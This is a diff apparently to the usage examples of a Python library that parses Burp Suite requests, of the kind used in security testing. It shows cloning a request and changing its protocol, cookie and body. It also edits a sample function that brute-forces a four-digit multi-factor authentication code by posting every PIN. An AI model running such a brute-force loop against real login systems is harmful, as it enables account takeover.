@@ -18,11 +18,23 @@ req_from_string = burpr.parse_string(req_string)
 # Load from file
 req_from_file = burpr.parse_file(req_file_path)
 
-# clone the BurpRequest object
+# clone the request
 req_clone = burpr.clone(req_from_file)
+
+# change protocol to http1.1
+req_clone.set_protocol(burpr.protocols.HTTP1_1)
+
+# change transport to http
+req_clone.set_transport(burpr.transports.HTTP)
 
 # modify the header
 req_clone.set_header("Cookie", "session=modified_session_cookie")
+
+# modify the body
+req_clone.set_parameter("post-param", "AAABBBCCC")
+
+# adjust the request - change content-length
+burpr.prepare(req_clone)
 
 client = httpx.Client(http2=True)
 res = client.post(req.url, headers=req.headers, data=req.body)
@@ -64,15 +76,18 @@ def generate_pin_numbers():
           for permutation in itertools.product(list(range(0, 10)), repeat=4)]
 
 def brute_force_broken_mfa():
+  # Parse request from string
   req = burpr.parse_string(burp_request)
-  client = httpx.Client(http2=True)
+
+  # Create http client and check the protocol used
+  client = httpx.Client(http2=req.is_http2)
 
   for pin in generate_pin_numbers():
     # Modify the mfa-code parameter
     req.set_parameter("mfa-code", pin)
 
-    # Adjust Content-Length to parameter change
-    req.prepare()
+    # Adjust Content-Length for parameter change
+    burpr.prepare(req)
 
     # Send the request
     res = client.post(req.url, headers=req.headers, data=req.body)
